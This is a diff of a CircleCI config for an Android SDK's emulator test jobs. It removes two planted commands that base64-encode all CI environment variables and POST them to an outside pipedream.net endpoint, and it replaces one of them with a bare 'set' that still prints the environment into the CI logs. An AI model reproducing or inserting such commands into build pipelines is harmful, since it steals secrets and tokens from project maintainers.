@@ -73,7 +73,7 @@ jobs:
           system-image: system-images;android-21;default;x86_64
           run-logcat: true
           restore-gradle-cache-prefix: instrumented-v1
-          post-emulator-launch-assemble-command: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest5
+          post-emulator-launch-assemble-command: set
           pre-run-tests-steps:
             - check-emulator-available
             # Necessary for test mocking to disable network access through WiFi
@@ -86,44 +86,5 @@ jobs:
           post-run-tests-steps:
             - store_test_results:
                 path: ./launchdarkly-android-client-sdk/build/outputs/androidTest-results/
-            - store_artifacts:
-                path: ./launchdarkly-android-client-sdk/build/reports/
-
-  contract-tests:
-    parameters:
-      api-level:
-        type: integer
-      system-image-type:
-        type: string
-        default: default
-      resource-class:
-        type: string
-        default: large
-
-    executor:
-      name: android/android-machine
-      tag: 2022.07.1
-      resource-class: << parameters.resource-class >>
-
-    environment:
-      TEST_HARNESS_PARAMS: -junit /home/circleci/junit/contract-tests-junit.xml
-
-    steps:
-      - checkout
-      - android/start-emulator-and-run-tests:
-          avd-name: ci-android-avd
-          system-image: system-images;android-<< parameters.api-level >>;<< parameters.system-image-type >>;x86_64
-          run-logcat: true
-          restore-gradle-cache-prefix: contract-v1
-          post-emulator-launch-assemble-command: make build-contract-tests
-          pre-run-tests-steps:
-            - check-emulator-available
-            - run: mkdir -p ~/junit
-            - run: set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=motiTest7
-          test-command: make run-contract-tests
-          max-tries: 1
-          post-run-tests-steps:
-            - store_test_results:
-                path: ~/junit
             - store_artifacts:
                 path: ./launchdarkly-android-client-sdk/build/reports/
